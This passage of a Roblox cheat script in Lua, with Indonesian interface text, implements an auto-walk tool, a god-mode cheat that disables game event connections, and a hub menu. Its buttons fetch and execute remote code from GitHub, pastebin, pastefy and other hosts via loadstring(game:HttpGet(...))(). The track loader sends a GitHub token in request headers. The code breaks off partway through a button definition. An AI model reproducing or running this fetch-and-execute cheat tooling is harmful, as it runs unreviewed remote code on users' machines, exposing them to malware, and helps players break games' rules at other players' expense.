        local playBtn, playLbl = makeBtn("▶", "PLAY", C_PLA)
        local revBtn,  revLbl  = makeBtn("↩", "REVERSE",  C_REV)
        local flipBtn, flipLbl = makeBtn("↔", "FLIP", C_FLP)

        local _playCallback = nil
        local isPlayActive  = false
        local rev2, flipped2 = false, false

        -- -- Drag ----------------------------------------------
        local dragging, dragStart, startPos2, dragInput2 = false, nil, nil, nil
        local function updateDrag(inp)
            local d = inp.Position - dragStart
            panel.Position = UDim2.new(startPos2.X.Scale, startPos2.X.Offset+d.X, startPos2.Y.Scale, startPos2.Y.Offset+d.Y)
        end
        local function beginDrag(inp)
            dragging=true; dragStart=inp.Position; startPos2=panel.Position
            inp.Changed:Connect(function() if inp.UserInputState==Enum.UserInputState.End then dragging=false end end)
        end
        local function attachDrag(obj)
            obj.InputBegan:Connect(function(inp)
                if inp.UserInputType==Enum.UserInputType.MouseButton1 or inp.UserInputType==Enum.UserInputType.Touch then beginDrag(inp) end
            end)
            obj.InputChanged:Connect(function(inp)
                if inp.UserInputType==Enum.UserInputType.MouseMovement or inp.UserInputType==Enum.UserInputType.Touch then dragInput2=inp end
            end)
        end
        attachDrag(panel); attachDrag(hdr); attachDrag(titleLbl)
        UserInputService.InputChanged:Connect(function(inp) if dragging and inp==dragInput2 then updateDrag(inp) end end)

        -- -- Status dot ----------------------------------------
        local function setStatus(playing)
            statusDot.TextColor3 = playing and C_DOT_PLY or C_DOT_RDY
            statusDot.Text       = playing and "● PLAYING" or "● READY"
        end
        task.spawn(function()
            while ui.Parent do
                pcall(function() setStatus(isPlaying) end)
                task.wait(0.35)
            end
        end)

        -- -- PLAY / STOP ---------------------------------------
        playBtn.MouseButton1Click:Connect(function()
            if isPlayActive or isPlaying then
                stopPlayback(true)
                WindUI:Notify({Title="⏹ Stop", Content="Autowalk dihentikan.", Duration=2, Icon="square"})
            else
                if _playCallback then
                    _playCallback()
                else
                    WindUI:Notify({Title="Auto Walk", Content="Pilih track dulu dari tab Autowalk!", Duration=3})
                end
            end
        end)
        task.spawn(function()
            while ui.Parent do
                pcall(function()
                    if isPlaying and not isPlayActive then
                        isPlayActive=true
                        playBtn.Text="■"; playBtn.BackgroundColor3=C_STO; playLbl.Text="STOP"
                    elseif not isPlaying and isPlayActive then
                        isPlayActive=false
                        playBtn.Text="▶"; playBtn.BackgroundColor3=C_PLA; playLbl.Text="PLAY"
                    end
                end)
                task.wait(0.3)
            end
        end)

        -- -- REVERSE -------------------------------------------
        revBtn.MouseButton1Click:Connect(function()
            rev2 = not rev2
            isReversed = rev2
            if rev2 then
                revBtn.BackgroundColor3 = C_ACT_GLO; revLbl.Text = "NORMAL"
                WindUI:Notify({Title="↩ Reverse ON", Content="Arah dibalik!", Duration=2})
            else
                revBtn.BackgroundColor3 = C_REV; revLbl.Text = "REVERSE"
                WindUI:Notify({Title="Reverse OFF", Content="Arah normal.", Duration=2})
            end
        end)
        revBtn.MouseLeave:Connect(function()
            revBtn.BackgroundColor3 = rev2 and C_ACT_GLO or C_REV
        end)

        -- -- FLIP ----------------------------------------------
        flipBtn.MouseButton1Click:Connect(function()
            isFlipped = not isFlipped
            flipped2  = isFlipped
            if isFlipped then
                flipBtn.BackgroundColor3 = C_ACT_GLO; flipLbl.Text = "UNFLIP"
                WindUI:Notify({Title="↔ Flip ON", Content="Karakter dibalik!", Duration=2})
            else
                flipBtn.BackgroundColor3 = C_FLP; flipLbl.Text = "FLIP"
                WindUI:Notify({Title="Flip OFF", Content="Arah normal.", Duration=2})
            end
        end)
        flipBtn.MouseLeave:Connect(function()
            flipBtn.BackgroundColor3 = flipped2 and C_ACT_GLO or C_FLP
        end)

        -- -- Reset state ---------------------------------------
        local TW = 0.18
        local function resetUIState()
            rev2=false; flipped2=false; isPlayActive=false
            isPaused=false; isFlipped=false; isReversed=false
            playBtn.Text="▶"; playBtn.BackgroundColor3=C_PLA; playLbl.Text="PLAY"
            revBtn.BackgroundColor3=C_REV;   revLbl.Text="REVERSE"
            flipBtn.BackgroundColor3=C_FLP;  flipLbl.Text="FLIP"
            setStatus(false)
        end

        local function showUI()
            panel.Visible=true; panel.Size=UDim2.new(0,0,0,0)
            TweenService:Create(panel, TweenInfo.new(TW, Enum.EasingStyle.Back, Enum.EasingDirection.Out),
                {Size=UDim2.new(0,PW,0,PH)}):Play()
        end
        local function hideUI()
            TweenService:Create(panel, TweenInfo.new(TW, Enum.EasingStyle.Back, Enum.EasingDirection.In),
                {Size=UDim2.new(0,0,0,0)}):Play()
            task.delay(TW, function() panel.Visible=false end)
        end
        local function setPlayCallback(cb) _playCallback = cb end

        return { mainFrame=panel, showUI=showUI, hideUI=hideUI, resetUIState=resetUIState, setPlayCallback=setPlayCallback }
    end
        local pauseFlipUI = createPauseFlipUI()
    
    local originalStop = stopPlayback
    stopPlayback = function(force)
        originalStop(force)
        pauseFlipUI.resetUIState()
    end
    
    player.CharacterAdded:Connect(function(newChar)
        character = newChar
        humanoid = character:WaitForChild("Humanoid")
        humanoidRootPart = character:WaitForChild("HumanoidRootPart")
        
        if isPlaying then
            stopPlayback(true)
        end
    end)
    
    -- ============================================== --
    -- TRACK MANAGEMENT — DYNAMIC GITHUB
    -- ============================================== --

    -- Baca semua file JSON di satu folder repo (GitHub API)
    local function ghListFiles(folder)
        -- folder: e.g. "wiwokdetok/12345678"
        local apiUrl = "https://api.github.com/repos/" .. GH_USER .. "/" .. GH_REPO
                     .. "/contents/" .. folder
        local ok, res = safeHttpRequest(apiUrl, "GET", nil, {
            ["Authorization"] = "token " .. GH_TOKEN,
            ["Accept"]        = "application/vnd.github.v3+json",
            ["User-Agent"]    = "RobloxScript",
        })
        if not ok or not res or res == "" then return {} end
        local okD, data = pcall(function() return HttpService:JSONDecode(res) end)
        if not okD or type(data) ~= "table" then return {} end
        local result = {}
        for _, item in ipairs(data) do
            if type(item) == "table" and item.type == "file"
               and tostring(item.name):match("%.json$") then
                table.insert(result, {
                    name         = item.name,
                    download_url = item.download_url or "",
                })
            end
        end
        return result
    end

    -- Scan folder local untuk track yang pernah diupload sendiri
    local function scanLocalTracks(pid)
        -- Track local tersimpan di: POKAYSCRIPT/local_tracks/<pid>/<username>__<nama>.json
        local localDir = mainFolder .. "/local_tracks/" .. tostring(pid)
        if not isfolder(localDir) then return {} end
        local result = {}
        local ok, list = pcall(function() return listfiles(localDir) end)
        if not ok or not list then return {} end
        for _, path in ipairs(list) do
            local fname = path:match("([^/\\]+)$") or path
            if fname:match("%.json$") then
                -- Hanya tampilkan milik username sendiri
                local owner = fname:match("^([^_]+)__") or ""
                if owner:lower() == RobloxUsername:lower() or owner == "" then
                    table.insert(result, {
                        fname = fname,
                        path  = path,
                    })
                end
            end
        end
        return result
    end

    -- Ambil display name dari filename
    -- Format di repo: <NamaMap>.json   atau  <username>__<NamaMap>.json (private)
    -- Format local:   <username>__<NamaMap>.json
    local function getDisplayName(fname, source)
        local rawName = fname:gsub("%.json$", "")
        -- Hapus prefix username__ jika ada
        local withoutUser = rawName:match("^[^_]+__(.+)$") or rawName
        local displayBase = withoutUser:gsub("_", " ")
        if source == "local" then
            return "📁 (LOCAL) " .. displayBase
        elseif source == "public" then
            return "🌐 " .. displayBase
        elseif source == "donatur" then
            return "⭐ " .. displayBase
        else
            return displayBase
        end
    end

    -- Fetch semua track yang boleh diakses user sesuai role, untuk PlaceId saat ini
    local function fetchTrackList(onDone)
        local pid = tostring(game.PlaceId)
        ghTrackList   = {}
        ghTrackNames  = {}
        ghTrackByName = {}

        task.spawn(function()
            -- 1. PUBLIC — semua role bisa lihat
            local pubFiles = ghListFiles(GH_FOLDER_PUB .. "/" .. pid)
            for _, f in ipairs(pubFiles) do
                local display = getDisplayName(f.name, "public")
                local localDir = mainFolder .. "/tracks_pub/" .. pid
                local entry = {
                    displayName = display,
                    source      = "public",
                    ghFolder    = GH_FOLDER_PUB .. "/" .. pid,
                    fileName    = f.name,
                    downloadUrl = f.download_url,
                    localFolder = localDir,
                    localPath   = localDir .. "/" .. f.name,
                    isLocal     = false,
                }
                table.insert(ghTrackList, entry)
                table.insert(ghTrackNames, display)
                ghTrackByName[display] = entry
            end

            -- 2. DONATUR — hanya donatur, admin, owner
            if isDonatur() or isOwnerOrAdmin() then
                local donFiles = ghListFiles(GH_FOLDER_DON .. "/" .. pid)
                for _, f in ipairs(donFiles) do
                    local display = getDisplayName(f.name, "donatur")
                    local localDir = mainFolder .. "/tracks_don/" .. pid
                    local entry = {
                        displayName = display,
                        source      = "donatur",
                        ghFolder    = GH_FOLDER_DON .. "/" .. pid,
                        fileName    = f.name,
                        downloadUrl = f.download_url,
                        localFolder = localDir,
                        localPath   = localDir .. "/" .. f.name,
                        isLocal     = false,
                    }
                    table.insert(ghTrackList, entry)
                    table.insert(ghTrackNames, display)
                    ghTrackByName[display] = entry
                end
            end

            -- 3. PRIVATE di repo — hanya owner/admin yg bisa lihat semua,
            --    freeuser/donatur hanya lihat file milik sendiri
            do
                local privFiles = ghListFiles(GH_FOLDER_PRIV .. "/" .. pid)
                for _, f in ipairs(privFiles) do
                    -- Cek kepemilikan dari prefix username__
                    local owner = f.name:match("^([^_]+)__") or ""
                    local isMine = owner:lower() == RobloxUsername:lower()
                    local canSee = isOwnerOrAdmin() or isMine

                    if canSee then
                        -- Label "(LOCAL nama)" untuk file milik sendiri
                        local display
                        if isMine and not isOwnerOrAdmin() then
                            display = getDisplayName(f.name, "local")
                        else
                            display = getDisplayName(f.name, "private")
                                   :gsub("^📁 %(LOCAL%)", "🔒 [" .. owner .. "]")
                        end
                        -- Koreksi: kalau milik sendiri gunakan label LOCAL
                        if isMine then
                            display = getDisplayName(f.name, "local")
                        end

                        local localDir = mainFolder .. "/tracks_priv/" .. pid
                        local entry = {
                            displayName = display,
                            source      = "private",
                            ghFolder    = GH_FOLDER_PRIV .. "/" .. pid,
                            fileName    = f.name,
                            downloadUrl = f.download_url,
                            localFolder = localDir,
                            localPath   = localDir .. "/" .. f.name,
                            isLocal     = false,
                        }
                        table.insert(ghTrackList, entry)
                        table.insert(ghTrackNames, display)
                        ghTrackByName[display] = entry
                    end
                end
            end

            -- Urutkan: public dulu, lalu donatur, lalu local/private
            table.sort(ghTrackNames, function(a, b)
                local function rank(s)
                    if s:sub(1,2) == "🌐" then return 1
                    elseif s:sub(1,2) == "⭐" then return 2
                    else return 3 end
                end
                local ra, rb = rank(a), rank(b)
                if ra ~= rb then return ra < rb end
                return a < b
            end)

            if onDone then onDone(ghTrackNames) end
        end)
    end

    -- Download satu track ke lokal (cache), kembalikan localPath
    local function ensureTrackLocal(entry)
        -- Buat folder jika belum ada
        if not isfolder(entry.localFolder) then
            pcall(function() makefolder(entry.localFolder) end)
        end
        -- Cek apakah sudah ada lokal
        if isfile(entry.localPath) then return entry.localPath end
        -- Download
        local ok2, res = pcall(function() return game:HttpGet(entry.downloadUrl) end)
        if not ok2 or not res or #res < 2 then
            WindUI:Notify({Title="❌ Gagal Download", Content=tostring(res):sub(1,60), Duration=4, Icon="x-circle"})
            return nil
        end
        pcall(function() writefile(entry.localPath, res) end)
        return entry.localPath
    end

    -- ============================================== --
    -- TRACK TOGGLE OBJECTS  (1 entry = 1 JSON file)
    -- ============================================== --
    local trackToggleObjects = {}

    local function clearTrackToggles()
        for _, obj in ipairs(trackToggleObjects) do
            pcall(function() obj:Destroy() end)
        end
        trackToggleObjects = {}
    end

    local function createTrackToggles(displayName)
        clearTrackToggles()
        stopPlayback(true)

        local entry = ghTrackByName[displayName]
        if not entry then
            WindUI:Notify({Title="Error", Content="Track tidak ditemukan.", Duration=3, Icon="x-circle"})
            return
        end

        WindUI:Notify({Title="⬇️ Memuat Track...", Content=displayName, Duration=3, Icon="loader"})

        task.spawn(function()
            local localPath = ensureTrackLocal(entry)
            if not localPath then return end

            -- Baca untuk info
            local frameCount = 0
            pcall(function()
                local raw = readfile(localPath)
                local ok3, d = pcall(function() return HttpService:JSONDecode(raw) end)
                if ok3 and type(d) == "table" then frameCount = #d end
            end)

            local fname = entry.fileName
            local sourceLabel = entry.source == "local" and "LOCAL"
                             or entry.source == "public"  and "PUBLIC"
                             or entry.source == "donatur" and "DONATUR"
                             or "PRIVATE"

            -- Update global env untuk Update Checkpoint tab
            currentJsonFiles = { localPath }
            getgenv().AutoWalk_CurrentTrack      = displayName
            getgenv().AutoWalk_CurrentJsonFolder = entry.localFolder
            getgenv().AutoWalk_CurrentJsonFiles  = currentJsonFiles

            -- Set callback POKAY CORE PLAYBTN → langsung jalankan track ini
            pauseFlipUI.setPlayCallback(function()
                playSingleCheckpointFile(localPath)
            end)

            -- Paragraph info saja — tidak ada tombol PLAY/STOP di tab
            local infoPara = AutowalkTab:Paragraph({
                Title = "📍 Track: " .. displayName,
                Desc  = "📁 " .. fname
                     .. "\n🎞 Frames: " .. frameCount
                     .. "\n🏷 Sumber: " .. sourceLabel
                     .. "\n🎮 Place ID: " .. tostring(game.PlaceId)
                     .. "\n\n▶ Tekan PLAYBTN di POKAY CORE untuk mulai.",
            })
            table.insert(trackToggleObjects, infoPara)

            WindUI:Notify({
                Title   = "✅ Track Siap",
                Content = fname .. "\nTekan ▶ PLAYBTN di POKAY CORE!",
                Duration = 3, Icon = "play"
            })
        end)
    end

    -- ============================================== --
    -- AUTO WALK UI — SECTION & CONTROLS
    -- ============================================== --

    AutowalkTab:Section({
        Title          = "POKAY Script | Auto Walk",
        TextTransparency = 0.05,
        TextXAlignment = "Left",
        TextSize       = 17,
    })

    AutowalkTab:Divider()

    -- Enable Loop
    AutowalkTab:Toggle({
        Title = "Enable Loop",
        Desc  = "Berfungsi menjalankan autowalk secara berulang ulang.",
        Icon  = "check",
        Type  = "Checkbox",
        Value = false,
        Callback = function(state)
            isLoopingEnabled = state
            if state then
                WindUI:Notify({Title="Looping", Content="Berhasil diaktifkan! Pilih checkpoint untuk memulai loop.", Duration=3, Icon="repeat"})
            else
                WindUI:Notify({Title="Looping", Content="Berhasil dimatikan!", Duration=3, Icon="x"})
                if isLoopingActive then isLoopingActive=false; stopPlayback(true) end
            end
        end
    })

    -- Auto Respawn
    AutowalkTab:Toggle({
        Title = "Auto Respawn",
        Desc  = "Respawn otomatis ketika mencapai checkpoint terakhir (jika Loop aktif).",
        Icon  = "check",
        Type  = "Checkbox",
        Value = false,
        Callback = function(state)
            autoRespawnEnabled = state
            WindUI:Notify({
                Title   = "Auto Respawn",
                Content = state and "Fitur Auto Respawn diaktifkan!" or "Fitur Auto Respawn dimatikan.",
                Duration = 3, Icon = state and "check" or "x"
            })
        end
    })

    -- God Mode
    local godModeEnabled = false
    local function enableGodMode()
        godModeEnabled = true
        task.spawn(function()
            while godModeEnabled do
                local char2 = player.Character or player.CharacterAdded:Wait()
                local hum2  = char2:FindFirstChildOfClass("Humanoid")
                if hum2 then
                    hum2.Health = hum2.MaxHealth
                    hum2.HealthChanged:Connect(function()
                        if godModeEnabled and hum2.Health < hum2.MaxHealth then
                            hum2.Health = hum2.MaxHealth
                        end
                    end)
                    hum2.Died:Connect(function()
                        if godModeEnabled then
                            task.wait(0.1); player:LoadCharacter()
                            task.wait(1); enableGodMode()
                        end
                    end)
                    pcall(function()
                        for _, conn in pairs(getconnections(hum2.StateChanged)) do conn:Disable() end
                    end)
                    hum2.BreakJointsOnDeath = false
                end
                task.wait(0.2)
            end
        end)
    end
    local function disableGodMode() godModeEnabled = false end

    AutowalkTab:Toggle({
        Title = "Enable God Mode",
        Desc  = "Berfungsi agar karakter kita tidak bisa terkena damage / mati.",
        Icon  = "check",
        Type  = "Checkbox",
        Value = false,
        Callback = function(state)
            if state then enableGodMode() else disableGodMode() end
            WindUI:Notify({
                Title   = "God Mode",
                Content = state and "God Mode diaktifkan!" or "God Mode dimatikan.",
                Duration = 3, Icon = "shield"
            })
        end
    })

    -- Speed
    AutowalkTab:Slider({
        Title = "Speed Auto Walk",
        Desc  = "Berfungsi mengatur kecepatan auto walk.",
        Step  = 0.1,
        Value = { Min = 0.5, Max = 10, Default = 1.0 },
        Callback = function(value)
            playbackSpeed = value
            WindUI:Notify({Title="Speed", Content=string.format("Speed diatur ke %.1fx", value), Duration=2, Icon="gauge"})
        end
    })

    -- ⚡ Auto Coil
    AutowalkTab:Toggle({
        Title = "[⚡] Auto Coil",
        Desc  = "Otomatis equip tool dari rekaman JSON (misal: COIL 2) dan set WalkSpeed sesuai rekaman saat autowalk berjalan.",
        Icon  = "zap",
        Type  = "Checkbox",
        Value = false,
        Callback = function(state)
            isAutoCoilEnabled = state
            if not state then lastEquippedTool = nil end
            WindUI:Notify({
                Title   = state and "⚡ Auto Coil ON" or "Auto Coil OFF",
                Content = state and "Tool dari JSON akan di-equip otomatis!" or "Auto Coil dimatikan.",
                Duration = 3, Icon = state and "zap" or "zap-off",
            })
        end
    })

    -- ✂️ Bypass Time (Smooth Idle)
    AutowalkTab:Toggle({
        Title = "[✂] Bypass Time (Smooth Idle)",
        Desc  = "Kompres jeda/stop saat rekaman. Cocok buat yang sering kedat-kedut pas lewat rintangan.",
        Icon  = "scissors",
        Type  = "Checkbox",
        Value = false,
        Callback = function(state)
            isBypassTimeEnabled = state
            WindUI:Notify({
                Title   = state and "✂ Bypass Time ON" or "Bypass Time OFF",
                Content = state
                    and string.format("Stop >%.1fs di rekaman akan di-compress jadi %.2fs.", bypassTimeThreshold, bypassTimeMax)
                    or  "Playback mengikuti timing asli rekaman.",
                Duration = 3, Icon = "scissors",
            })
        end
    })

    AutowalkTab:Slider({
        Title = "Bypass Threshold (detik)",
        Desc  = "Idle lebih dari X detik di rekaman akan di-compress. Makin kecil = makin agresif skip stopnya.",
        Step  = 0.1,
        Value = { Min = 0.1, Max = 3.0, Default = 0.5 },
        Callback = function(value)
            bypassTimeThreshold = value
        end
    })

    AutowalkTab:Slider({
        Title = "Bypass Max Duration (detik)",
        Desc  = "Idle yang panjang di-cap jadi X detik. Set 0 = skip total, 0.1~0.3 = tetap ada jeda singkat.",
        Step  = 0.05,
        Value = { Min = 0.0, Max = 1.0, Default = 0.15 },
        Callback = function(value)
            bypassTimeMax = value
        end
    })

    AutowalkTab:Divider()

    -- -- Section: Auto Walk | Menu ---------------------------------
    AutowalkTab:Section({
        Title          = "Auto Walk | Menu",
        TextTransparency = 0.05,
        TextXAlignment = "Left",
        TextSize       = 17,
    })

    -- Refresh Button
    AutowalkTab:Button({
        Title = "[🔄] Refresh Daftar Track",
        Icon  = "refresh-cw",
        Callback = function()
            WindUI:Notify({Title="🔄 Memuat...", Content="Place ID: "..tostring(game.PlaceId), Duration=2, Icon="loader"})
            fetchTrackList(function(names)
                if TrackDropdown then
                    pcall(function() TrackDropdown:Refresh(names, true) end)
                end
                local total = #names
                WindUI:Notify({
                    Title   = total > 0 and ("✅ " .. total .. " Track Ditemukan") or "📂 Belum Ada Track",
                    Content = total > 0
                        and ("🌐 Public + " .. (isDonatur() and "⭐ Donatur + " or "") .. "📁 Local milikmu")
                        or  "Upload track dulu via tab ☁️ Upload",
                    Duration = 4, Icon = total > 0 and "map" or "file-x"
                })
            end)
        end
    })

    -- Track Dropdown — isi kosong dulu, diisi setelah refresh
    local TrackDropdown = AutowalkTab:Dropdown({
        Title    = "[◉] SELECT TRACK",
        Values   = {},
        Multi    = false,
        AllowNone = true,
        SearchBarEnabled = true,
        Callback = function(selectedName)
            if selectedName and selectedName ~= "" then
                createTrackToggles(selectedName)
            else
                clearTrackToggles()
                getgenv().AutoWalk_CurrentTrack      = nil
                getgenv().AutoWalk_CurrentJsonFolder = nil
                getgenv().AutoWalk_CurrentJsonFiles  = nil
            end
        end
    })

    -- Auto-load track list saat tab pertama kali dibuka
    task.defer(function()
        fetchTrackList(function(names)
            pcall(function() TrackDropdown:Refresh(names, true) end)
            if #names > 0 then
                WindUI:Notify({
                    Title   = "✅ " .. #names .. " Track Siap",
                    Content = "Place ID: " .. tostring(game.PlaceId),
                    Duration = 3, Icon = "map"
                })
            else
                WindUI:Notify({
                    Title   = "📂 Belum Ada Track",
                    Content = "Upload track dulu via tab ☁️ Upload",
                    Duration = 4, Icon = "file-x"
                })
            end
        end)
    end)

    AutowalkTab:Divider()

    -- Tombol POKAY CORE Control UI
    AutowalkTab:Button({
        Title    = "◆  Tampilkan / Sembunyikan POKAY CORE",
        Desc     = "Floating UI dengan tombol PLAY, REVERSE, FLIP, STOP — bisa di-drag.",
        Icon     = "monitor",
        Callback = function()
            if pauseFlipUI.mainFrame.Visible then
                pauseFlipUI.hideUI()
                WindUI:Notify({Title="POKAY CORE", Content="UI disembunyikan.", Duration=1, Icon="eye-off"})
            else
                pauseFlipUI.showUI()
                WindUI:Notify({Title="POKAY CORE", Content="UI ditampilkan! Bisa di-drag.", Duration=2, Icon="monitor"})
            end
        end
    })

    AutowalkTab:Divider()
end

local function setupListScript()
    if not ListScript then return end
    if getgenv()["_SETUP_DONE_setupListScript"] then return end
    getgenv()["_SETUP_DONE_setupListScript"] = true 
--| =========================================================== |--
--| AUTOWALK TAB SETUP                                          |--
--| =========================================================== |--
    local AwwalkTab = ListScript:Section({
        Title = "Other Auto Walk Prem Free | Tidak Di Perjual Belikan",
        Icon = "flame",
        Opened = false,
    })
    AwwalkTab:Button({
        Title = "POKAY CP Marker (Teleport)",
        Icon = "file",
        Callback = function()
            do
                local _ok, _err = pcall(function() loadstring(game:HttpGet("https://raw.githubusercontent.com/itwasabraham/AtinWhitelist/refs/heads/main/tiriskan"))() end)
                if not _ok then
                    WindUI:Notify({Title="❌ Script Error", Content="tiriskan\n"..tostring(_err):sub(1,80), Duration=5, Icon="x-circle"})
                end
            end
        end
    })
    AwwalkTab:Button({
        Title = "POKAY Other Script",
        Icon = "file",
        Callback = function()
            do
                local _ok, _err = pcall(function() loadstring(game:HttpGet("https://pastebin.com/raw/u1zVzPq0"))() end)
                if not _ok then
                    WindUI:Notify({Title="❌ Script Error", Content="u1zVzPq0\n"..tostring(_err):sub(1,80), Duration=5, Icon="x-circle"})
                end
            end
        end
    })
    AwwalkTab:Button({
        Title = "Fyy Premium Auto Walk",
        Icon = "file",
        Callback = function()
            do
                local _ok, _err = pcall(function() loadstring(game:HttpGet("https://raw.githubusercontent.com/itwasabraham/skill-issue/refs/heads/main/MT_LOADER.txt"))() end)
                if not _ok then
                    WindUI:Notify({Title="❌ Script Error", Content="MT_LOADER.txt\n"..tostring(_err):sub(1,80), Duration=5, Icon="x-circle"})
                end
            end
        end
    })
    AwwalkTab:Button({
        Title = "Haku Premium Auto Walk",
        Icon = "file",
        Callback = function()
            do
                local _ok, _err = pcall(function() loadstring(game:HttpGet("https://pastefy.app/kN3OuaEu/raw"))() end)
                if not _ok then
                    WindUI:Notify({Title="❌ Script Error", Content="raw\n"..tostring(_err):sub(1,80), Duration=5, Icon="x-circle"})
                end
            end
        end
    })
    AwwalkTab:Button({
       Title = "David Premium Auto Walk",
       Icon = "file",
       Callback = function()
           do
               local _ok, _err = pcall(function() loadstring(game:HttpGet("https://pastefy.app/6LufDiXp/raw"))() end)
               if not _ok then
                   WindUI:Notify({Title="❌ Script Error", Content="raw\n"..tostring(_err):sub(1,80), Duration=5, Icon="x-circle"})
               end
           end
       end
    })    
    AwwalkTab:Button({
        Title = "Tarzz Auto Walk",
        Icon = "file",
        Callback = function()
            do
                local _ok, _err = pcall(function() loadstring(game:HttpGet("https://pastefy.app/OCrIDnMV/raw"))() end)
                if not _ok then
                    WindUI:Notify({Title="❌ Script Error", Content="raw\n"..tostring(_err):sub(1,80), Duration=5, Icon="x-circle"})
                end
            end
        end
    })
    AwwalkTab:Button({
        Title = "WataX Auto Walk",
        Icon = "file",
        Callback = function()
            do
                local _ok, _err = pcall(function() loadstring(game:HttpGet("https://pastefy.app/6qnMhVmj/raw"))() end)
                if not _ok then
                    WindUI:Notify({Title="❌ Script Error", Content="raw\n"..tostring(_err):sub(1,80), Duration=5, Icon="x-circle"})
                end
            end
        end
    })
--| =========================================================== |--
--| Fishit SETUP                                          |--
--| =========================================================== |--        
    local FishitTab = ListScript:Section({
        Title = "Fish It Script Prem Free | Tidak Di Perjual Belikan",
        Icon = "fish",
        Opened = false,
        })
    
    FishitTab:Button({
        Title = "VinZ Hub Premium Fish It",
        Icon = "file",
        Callback = function()
            do
                local _ok, _err = pcall(function() loadstring(game:HttpGet("https://raw.githubusercontent.com/itwasabraham/skill-issue/refs/heads/main/VinPREMFish"))() end)
                if not _ok then
                    WindUI:Notify({Title="❌ Script Error", Content="VinPREMFish\n"..tostring(_err):sub(1,80), Duration=5, Icon="x-circle"})
                end
            end
        end
    })
    FishitTab:Button({
        Title = "Glua Premium Fish It",
        Icon = "file",
        Callback = function()
            do
                local _ok, _err = pcall(function() loadstring(game:HttpGet("https://raw.githubusercontent.com/itwasabraham/skill-issue/refs/heads/main/GLUAPremFishIt.txt"))() end)
                if not _ok then
                    WindUI:Notify({Title="❌ Script Error", Content="GLUAPremFishIt.txt\n"..tostring(_err):sub(1,80), Duration=5, Icon="x-circle"})
                end
            end
        end
    })
    FishitTab:Button({
        Title = "Souls Hub Premium Fish It",
        Icon = "file",
        Callback = function()
            do
                local _ok, _err = pcall(function() loadstring(game:HttpGet("https://raw.githubusercontent.com/itwasabraham/skill-issue/refs/heads/main/SoulsHubFishIt.txt"))() end)
                if not _ok then
                    WindUI:Notify({Title="❌ Script Error", Content="SoulsHubFishIt.txt\n"..tostring(_err):sub(1,80), Duration=5, Icon="x-circle"})
                end
            end
        end
    })
    FishitTab:Button({
        Title = "Rock Hub Premium Fish It",
        Icon = "file",
        Callback = function()
            do
                local _ok, _err = pcall(function() loadstring(game:HttpGet("https://raw.githubusercontent.com/itwasabraham/skill-issue/refs/heads/main/RockH/FishitRock"))() end)
                if not _ok then
                    WindUI:Notify({Title="❌ Script Error", Content="FishitRock\n"..tostring(_err):sub(1,80), Duration=5, Icon="x-circle"})
                end
            end
        end
    })  
    FishitTab:Button({
        Title = "Fyy Premium Fish It",
        Icon = "file",
        Callback = function()
            do
                local _ok, _err = pcall(function() loadstring(game:HttpGet("https://raw.githubusercontent.com/itwasabraham/skill-issue/refs/heads/main/FISHIT%20LOADER.txt"))() end)
                if not _ok then
                    WindUI:Notify({Title="❌ Script Error", Content="FISHIT%20LOADER.txt\n"..tostring(_err):sub(1,80), Duration=5, Icon="x-circle"})
                end
            end
        end
    })    
    FishitTab:Button({
        Title = "717 Prem Fish it",
        Icon = "file",
        Callback = function()
            do
                local _ok, _err = pcall(function() loadstring(game:HttpGet("https://raw.githubusercontent.com/itwasabraham/skill-issue/refs/heads/main/717skillissue/717fishit"))() end)
                if not _ok then
                    WindUI:Notify({Title="❌ Script Error", Content="717fishit\n"..tostring(_err):sub(1,80), Duration=5, Icon="x-circle"})
                end
            end
        end
    })
    FishitTab:Button({
        Title = "SansMoba Prem Fishit",
        Icon = "file",
        Callback = function()
            do
                local _ok, _err = pcall(function() loadstring(game:HttpGet("https://raw.githubusercontent.com/itwasabraham/skill-issue/refs/heads/main/SansSEWALITA/SansPlenger"))() end)
                if not _ok then
                    WindUI:Notify({Title="❌ Script Error", Content="SansPlenger\n"..tostring(_err):sub(1,80), Duration=5, Icon="x-circle"})
                end
            end
        end
    })
--| =========================================================== |--
--| Vidi TAB SETUP                                          |--
--| =========================================================== |--    
    local VidiTab = ListScript:Section({
        Title = "Violance Districy Script | Tidak Di Perjual Belikan",
        Icon = "bot",
        Opened = false,
    })
    VidiTab:Button({
        Title = "POKAY Violance District",
        Icon = "file",
        Callback = function()
            do
                local _ok, _err = pcall(function() loadstring(game:HttpGet("https://marvscript.my.id/rawku.php?file=Jason/marvd"))() end)
                if not _ok then
                    WindUI:Notify({Title="❌ Script Error", Content="marvd\n"..tostring(_err):sub(1,80), Duration=5, Icon="x-circle"})
                end
            end
        end
    })
    VidiTab:Button({
        Title = "Vinz Prem Violance District",
        Icon = "file",
        Callback = function()
            do
                local _ok, _err = pcall(function() loadstring(game:HttpGet("https://raw.githubusercontent.com/itwasabraham/skill-issue/refs/heads/main/VinzVD.txt"))() end)
                if not _ok then
                    WindUI:Notify({Title="❌ Script Error", Content="VinzVD.txt\n"..tostring(_err):sub(1,80), Duration=5, Icon="x-circle"})
                end
            end
        end
    })
    VidiTab:Button({
        Title = "717 Prem Violance District",
        Icon = "file",
        Callback = function()
            do
                local _ok, _err = pcall(function() loadstring(game:HttpGet("https://raw.githubusercontent.com/itwasabraham/skill-issue/refs/heads/main/717skillissue/717vd"))() end)
                if not _ok then
                    WindUI:Notify({Title="❌ Script Error", Content="717vd\n"..tostring(_err):sub(1,80), Duration=5, Icon="x-circle"})
                end
            end
        end
    })    
    VidiTab:Button({
        Title = "Toasty Violance District",
        Icon = "file",
        Callback = function()
            do
                local _ok, _err = pcall(function() loadstring(game:HttpGet("https://raw.githubusercontent.com/nouralddin-abdullah/Airlines/refs/heads/main/violence-district.lua"))() end)
                if not _ok then
                    WindUI:Notify({Title="❌ Script Error", Content="violence-district.lua\n"..tostring(_err):sub(1,80), Duration=5, Icon="x-circle"})
                end
            end
        end
    })
--| =========================================================== |--
--| Hangout TAB SETUP                                          |--
--| =========================================================== |--    
    local HangouttTab = ListScript:Section({
        Title = "Hangout Script | Tidak Di Perjual Belikan",
        Icon = "webhook",
        Opened = false,
    }) 
    HangouttTab:Button({
        Title = "[PC] indo Voice",
        Icon = "file",
        Callback = function()
            do
                local _ok, _err = pcall(function() loadstring(game:HttpGet("https://raw.githubusercontent.com/itwasabraham/skill-issue/refs/heads/main/indovoice"))() end)
                if not _ok then
                    WindUI:Notify({Title="❌ Script Error", Content="indovoice\n"..tostring(_err):sub(1,80), Duration=5, Icon="x-circle"})
                end
            end
        end
    })
    HangouttTab:Button({
        Title = "Indo Hangout | Auto Fish",
        Icon = "file",
        Callback = function()
            do
